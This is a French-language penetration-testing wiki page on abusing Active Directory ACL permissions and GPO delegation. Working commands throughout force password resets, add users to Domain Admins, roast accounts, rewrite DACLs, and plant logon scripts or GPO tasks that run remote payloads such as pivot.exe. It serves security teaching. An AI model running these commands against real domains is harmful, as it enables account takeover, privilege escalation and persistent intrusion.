# Abus des ACL/ACE Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Cette page est principalement un résumé des techniques de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles originaux.**

## BadSuccessor

{{#ref}}
BadSuccessor.md
{{#endref}}

## **Droits GenericAll sur l'utilisateur**

Ce privilège accorde à un attaquant un contrôle total sur un compte utilisateur cible. Une fois les droits `GenericAll` confirmés à l'aide de la commande `Get-ObjectAcl`, un attaquant peut :

- **Changer le mot de passe de la cible** : En utilisant `net user <username> <password> /domain`, l'attaquant peut réinitialiser le mot de passe de l'utilisateur.
- **Kerberoasting ciblé** : Assigner un SPN au compte de l'utilisateur pour le rendre kerberoastable, puis utiliser Rubeus et targetedKerberoast.py pour extraire et tenter de cracker les hachages du ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **ASREPRoasting ciblé** : Désactivez la pré-authentification pour l'utilisateur, rendant son compte vulnérable à l'ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Droits GenericAll sur le Groupe**

Ce privilège permet à un attaquant de manipuler les appartenances aux groupes s'il a des droits `GenericAll` sur un groupe comme `Domain Admins`. Après avoir identifié le nom distingué du groupe avec `Get-NetGroup`, l'attaquant peut :

- **S'ajouter au Groupe des Domain Admins** : Cela peut être fait via des commandes directes ou en utilisant des modules comme Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Détenir ces privilèges sur un objet ordinateur ou un compte utilisateur permet de :

- **Kerberos Resource-based Constrained Delegation** : Permet de prendre le contrôle d'un objet ordinateur.
- **Shadow Credentials** : Utilisez cette technique pour usurper l'identité d'un ordinateur ou d'un compte utilisateur en exploitant les privilèges pour créer des identifiants fantômes.

## **WriteProperty on Group**

Si un utilisateur a des droits `WriteProperty` sur tous les objets pour un groupe spécifique (par exemple, `Domain Admins`), il peut :

- **Add Themselves to the Domain Admins Group** : Réalisable en combinant les commandes `net user` et `Add-NetGroupUser`, cette méthode permet une élévation de privilèges au sein du domaine.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Auto (Auto-Appartenance) dans le Groupe**

Ce privilège permet aux attaquants de s'ajouter à des groupes spécifiques, tels que `Domain Admins`, via des commandes qui manipulent directement l'appartenance au groupe. L'utilisation de la séquence de commandes suivante permet l'auto-ajout :
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Auto-adhésion)**

Un privilège similaire, cela permet aux attaquants de s'ajouter directement à des groupes en modifiant les propriétés du groupe s'ils ont le droit `WriteProperty` sur ces groupes. La confirmation et l'exécution de ce privilège sont effectuées avec :
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Détenir le `ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser les mots de passe sans connaître le mot de passe actuel. La vérification de ce droit et son exploitation peuvent être effectuées via PowerShell ou d'autres outils en ligne de commande, offrant plusieurs méthodes pour réinitialiser le mot de passe d'un utilisateur, y compris des sessions interactives et des commandes en une ligne pour des environnements non interactifs. Les commandes vont des invocations PowerShell simples à l'utilisation de `rpcclient` sur Linux, démontrant la polyvalence des vecteurs d'attaque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner sur le groupe**

Si un attaquant découvre qu'il a des droits `WriteOwner` sur un groupe, il peut changer la propriété du groupe en sa faveur. Cela a un impact particulier lorsque le groupe en question est `Domain Admins`, car changer la propriété permet un contrôle plus large sur les attributs et l'appartenance du groupe. Le processus consiste à identifier l'objet correct via `Get-ObjectAcl` puis à utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, soit par SID, soit par nom.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite sur l'utilisateur**

Cette permission permet à un attaquant de modifier les propriétés de l'utilisateur. Plus précisément, avec l'accès `GenericWrite`, l'attaquant peut changer le chemin du script de connexion d'un utilisateur pour exécuter un script malveillant lors de la connexion de l'utilisateur. Cela est réalisé en utilisant la commande `Set-ADObject` pour mettre à jour la propriété `scriptpath` de l'utilisateur cible afin de pointer vers le script de l'attaquant.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite sur le groupe**

Avec ce privilège, les attaquants peuvent manipuler l'appartenance aux groupes, comme s'ajouter ou ajouter d'autres utilisateurs à des groupes spécifiques. Ce processus implique de créer un objet d'identification, de l'utiliser pour ajouter ou supprimer des utilisateurs d'un groupe, et de vérifier les changements d'appartenance avec des commandes PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Posséder un objet AD et avoir des privilèges `WriteDACL` sur celui-ci permet à un attaquant de se donner des privilèges `GenericAll` sur l'objet. Cela est accompli par la manipulation d'ADSI, permettant un contrôle total sur l'objet et la capacité de modifier ses appartenances de groupe. Malgré cela, des limitations existent lors de la tentative d'exploiter ces privilèges en utilisant les cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Réplication sur le Domaine (DCSync)**

L'attaque DCSync exploite des permissions de réplication spécifiques sur le domaine pour imiter un Contrôleur de Domaine et synchroniser des données, y compris des identifiants d'utilisateur. Cette technique puissante nécessite des permissions telles que `DS-Replication-Get-Changes`, permettant aux attaquants d'extraire des informations sensibles de l'environnement AD sans accès direct à un Contrôleur de Domaine. [**En savoir plus sur l'attaque DCSync ici.**](../dcsync.md)

## Délégation GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Délégation GPO

L'accès délégué pour gérer les Objets de Politique de Groupe (GPO) peut présenter des risques de sécurité significatifs. Par exemple, si un utilisateur tel que `offense\spotless` se voit déléguer des droits de gestion de GPO, il peut avoir des privilèges tels que **WriteProperty**, **WriteDacl**, et **WriteOwner**. Ces permissions peuvent être abusées à des fins malveillantes, comme identifié en utilisant PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Énumérer les Permissions GPO

Pour identifier les GPO mal configurés, les cmdlets de PowerSploit peuvent être enchaînées. Cela permet de découvrir les GPO que un utilisateur spécifique a la permission de gérer : `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Ordinateurs avec une Politique Donnée Appliquée** : Il est possible de résoudre quels ordinateurs une GPO spécifique s'applique, aidant à comprendre l'étendue de l'impact potentiel. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politiques Appliquées à un Ordinateur Donné** : Pour voir quelles politiques sont appliquées à un ordinateur particulier, des commandes comme `Get-DomainGPO` peuvent être utilisées.

**OUs avec une Politique Donnée Appliquée** : Identifier les unités organisationnelles (OUs) affectées par une politique donnée peut être fait en utilisant `Get-DomainOU`.

Vous pouvez également utiliser l'outil [**GPOHound**](https://github.com/cogiceo/GPOHound) pour énumérer les GPO et trouver des problèmes dans celles-ci.

### Abuser GPO - New-GPOImmediateTask

Les GPO mal configurés peuvent être exploités pour exécuter du code, par exemple, en créant une tâche planifiée immédiate. Cela peut être fait pour ajouter un utilisateur au groupe des administrateurs locaux sur les machines affectées, élevant ainsi considérablement les privilèges :
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Module GroupPolicy - Abus de GPO

Le module GroupPolicy, s'il est installé, permet la création et le lien de nouveaux GPO, ainsi que la définition de préférences telles que des valeurs de registre pour exécuter des backdoors sur les ordinateurs affectés. Cette méthode nécessite que le GPO soit mis à jour et qu'un utilisateur se connecte à l'ordinateur pour l'exécution :
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abus de GPO

SharpGPOAbuse offre une méthode pour abuser des GPO existants en ajoutant des tâches ou en modifiant des paramètres sans avoir besoin de créer de nouveaux GPO. Cet outil nécessite la modification des GPO existants ou l'utilisation des outils RSAT pour en créer de nouveaux avant d'appliquer des modifications :
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forcer la mise à jour de la politique

Les mises à jour de GPO se produisent généralement toutes les 90 minutes. Pour accélérer ce processus, en particulier après avoir mis en œuvre un changement, la commande `gpupdate /force` peut être utilisée sur l'ordinateur cible pour forcer une mise à jour immédiate de la politique. Cette commande garantit que toutes les modifications apportées aux GPO sont appliquées sans attendre le prochain cycle de mise à jour automatique.

### Sous le capot

Lors de l'inspection des tâches planifiées pour un GPO donné, comme la `Politique mal configurée`, l'ajout de tâches telles que `evilTask` peut être confirmé. Ces tâches sont créées par le biais de scripts ou d'outils en ligne de commande visant à modifier le comportement du système ou à élever les privilèges.

La structure de la tâche, comme indiqué dans le fichier de configuration XML généré par `New-GPOImmediateTask`, décrit les spécificités de la tâche planifiée - y compris la commande à exécuter et ses déclencheurs. Ce fichier représente comment les tâches planifiées sont définies et gérées au sein des GPO, fournissant une méthode pour exécuter des commandes ou des scripts arbitraires dans le cadre de l'application des politiques.

### Utilisateurs et groupes

Les GPO permettent également la manipulation des appartenances des utilisateurs et des groupes sur les systèmes cibles. En modifiant directement les fichiers de politique des Utilisateurs et des Groupes, les attaquants peuvent ajouter des utilisateurs à des groupes privilégiés, tels que le groupe `administrateurs` local. Cela est possible grâce à la délégation des permissions de gestion des GPO, qui permet la modification des fichiers de politique pour inclure de nouveaux utilisateurs ou changer les appartenances aux groupes.

Le fichier de configuration XML pour les Utilisateurs et les Groupes décrit comment ces changements sont mis en œuvre. En ajoutant des entrées à ce fichier, des utilisateurs spécifiques peuvent se voir accorder des privilèges élevés sur les systèmes affectés. Cette méthode offre une approche directe pour l'élévation des privilèges par la manipulation des GPO.

De plus, d'autres méthodes pour exécuter du code ou maintenir la persistance, telles que l'utilisation de scripts de connexion/déconnexion, la modification des clés de registre pour les autoruns, l'installation de logiciels via des fichiers .msi, ou l'édition des configurations de service, peuvent également être envisagées. Ces techniques offrent diverses voies pour maintenir l'accès et contrôler les systèmes cibles par l'abus des GPO.

## Références

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
